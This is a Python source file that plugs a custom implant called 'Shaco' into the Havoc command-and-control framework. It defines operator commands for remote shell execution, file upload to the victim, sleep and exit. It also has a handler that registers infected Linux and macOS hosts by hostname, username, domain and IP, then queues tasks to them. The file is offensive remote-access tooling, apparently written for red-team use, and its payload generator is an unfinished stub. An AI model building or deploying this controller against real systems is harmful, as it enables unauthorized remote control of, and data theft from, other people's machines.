#!/bin/python3
from traceback import print_exc
from havoc.agent import AgentType, Command, CommandParam, MessageType
from havoc.service import HavocService
from Protocol.python.Packer import Packer, Parser
from base64 import b64decode

COMMAND_OK = 13
COMMAND_GET = 14
COMMAND_OUTPUT = 15
COMMAND_NO_JOB = 16
COMMAND_ERR = 17
COMMAND_CHECKIN = 12

COMMAND_SHELL = 90
COMMAND_UPLOAD = 93
COMMAND_CD = 91
COMMAND_PWD = 92
COMMAND_EXIT = 94
COMMAND_SLEEP = 95

class CommandExit(Command):
    CommandId = COMMAND_EXIT
    Name = "exit"
    Description = ""
    Help = "exit"
    NeedAdmin = False
    Params = []
    Mitr = ['']

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()
        Task.add_int32( self.CommandId )
        Task.add_str( arguments['command'] )
        return Task.get_buffer()

class CommandSleep(Command):
    CommandId = COMMAND_SLEEP
    Name = "sleep"
    Description = "change sleep duration"
    Help = ""
    NeedAdmin = False
    Params = [
        CommandParam(
            name = 'time',
            is_file_path = False,
            is_optional = False
        )
    ]
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()
        Task.add_int32( self.CommandId )
        Task.add_int32( int(arguments['time']) )
        return Task.get_buffer()

class CommandShell(Command):
    CommandId = COMMAND_SHELL
    Name = "shell"
    Description = "executes commands using shell"
    Help = "shell <command>"
    NeedAdmin = False
    Params = [
        CommandParam(
            name="command",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = ['T1059.004']

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()
        Task.add_int32( self.CommandId )
        Task.add_str( arguments['command'] )
        return Task.get_buffer()

class CommandUpload(Command):
    CommandId = COMMAND_UPLOAD
    Name = "upload"
    Description = "upload file to agent"
    Help = "upload <localfile> <remote put file>"
    NeedAdmin = False
    Params = [
        CommandParam(
            name="localfile",
            is_file_path=True,
            is_optional=False
        ),
        CommandParam(
            name="remotefile",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = ['']

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()
        Task.add_int32( self.CommandId )
        Task.add_str( arguments['remotefile'] )
        Task.add_data64( b64decode(arguments['localfile']) )
        return Task.get_buffer()

class CommandCheckin(Command):
    CommandId = COMMAND_CHECKIN
    Name = "checkin"
    Description = "agent checkin"
    Help = "checkin"
    NeedAdmin = False
    Params = []
    Mitr = ['']

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()
        Task.add_int32( self.CommandId )
        return Task.get_buffer()

class CommandPwd(Command):
    CommandId = COMMAND_PWD
    Name = "pwd"
    Description = "get current directory"
    Help = "pwd"
    NeedAdmin = False
    Params = []

    Mitr = ['']

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()
        Task.add_int32( self.CommandId )
        return Task.get_buffer()

class CommandCd(Command):
    CommandId = COMMAND_CD
    Name = "cd"
    Description = "change direcroty"
    Help = "cd <path>"
    NeedAdmin = False
    Params = [
        CommandParam(
            name="command",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = ['']

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()
        Task.add_int32( self.CommandId )
        Task.add_str( arguments[ 'command' ] )
        return Task.get_buffer()

class Shaco(AgentType):
    Name = "Shaco"
    Author = "@souzomain"
    Version = "0.1"
    Description = f"""Shaco payload, version: {Version}"""
    MagicValue = 0x6861636f

    Arch = [
        "x64",
        "x86",
        'ARM'
    ]
    
    Formats = [
        {
            "Name": "Linux Executable",
            "Extension": "elf"
        },
        {
            'Name': 'Linux Shared Library',
            'Extension': 'so'
        },
        {
            "Name": "MacOS",
            "Extension": 'macho'
        },
    ]
    
    BuildingConfig = {
        'Sleep': '5',
        'Jitter': '0',
        'RemoteConfig' : False
    }

    Commands = [
        CommandShell(),
        #        CommandCd(), #fix error in shaco to change directory
        CommandPwd(),
        CommandUpload(),
        CommandCheckin(),
        CommandExit(),
        CommandSleep()
    ]

#TODO: implement generator
    def generate(self, config:dict) -> None:
        print(f"Config: {config}")
        self.builder_send_message(config['ClientID'], MessageType.Good, "later")

    def response(self, havoc_response: dict):
        agent_response = b64decode(havoc_response['Response'])
        parser  = Parser(agent_response)
        command = parser.get_int32()
        agent = havoc_response['Agent']
        agentid = havoc_response['AgentHeader']['AgentID']

        if command == COMMAND_CHECKIN:
            print("new command register request")

            RegisterInfo = {
                "AgentID"           : parser.get_int32(),
                "Hostname"          : parser.get_str(),
                "Username"          : parser.get_str(),
                "Domain"            : parser.get_str(),
                "InternalIP"        : parser.get_str(),
                "Process Path"      : "/",
                "Process ID"        : str(parser.get_int32()),
                "Process Parent ID" : "0",
                "Process Arch"      : "x64",
                "Process Name"      : "shaco",
                "Process Elevated"  : parser.get_int32(),
                "OS Version"        : "linux",
                "OS Build"          : "1.1.1",
                "OS Arch"           : "1.1.1",
                "Sleep"             : parser.get_int32(),
            }

            self.register(havoc_response['AgentHeader'], RegisterInfo)
            self.console_message(agentid, MessageType.Good, 'New agent registered', '')

            pack = Packer()
            pack.add_int32(COMMAND_OK)
            return pack.get_buffer()

        if agent == None:
            print("send agent checkin request")
            pack = Packer()
            pack.add_int32(COMMAND_CHECKIN)
            return pack.get_buffer()

        elif command == COMMAND_GET:
            agentid = havoc_response['Agent']['NameID']
            tasks = self.get_task_queue(agent)
            pack = Packer()
            if len(tasks) == 0:
                print('No task')
                pack.add_int32(COMMAND_NO_JOB)
                return pack.get_buffer()
            else:
                print('Returning task to agent')
                return tasks

        elif command == COMMAND_OUTPUT:
            cmdid = parser.get_int32()
            try:
                if cmdid == COMMAND_UPLOAD:
                    ok = Parser(parser.get_data()).get_int32()
                    if ok == 1:
                        self.console_message(agentid, MessageType.Good, 'Shaco Output: ', "uploaded file to the host")
                    else:
                        self.console_message(agentid, MessageType.Good, 'Shaco Output: ', "can't upload the file")
                else:        
                    raw = parser.get_data()
                    rawdec = Parser(raw)
                    out = rawdec.get_data()
                    self.console_message(agentid, MessageType.Good, 'Shaco Output: ', out.decode())
            except Exception as ex:
                print(f"Error on send message to operator: {str(ex)}")
                print_exc()
                self.console_message(agentid, MessageType.Error, 'Shaco Error: ', f"Error in output from command {cmdid}")

        print("Command not found")
        pack = Packer()
        pack.add_int32(COMMAND_ERR)
        return pack.get_buffer()

def main():
    Havoc_Shaco = Shaco()
    Havoc_Service = HavocService(
        endpoint="wss://127.0.0.1:40056/service-endpoint",
        password="service-password"
    )
    Havoc_Service.register_agent(Havoc_Shaco)

if __name__ == '__main__':
    main()
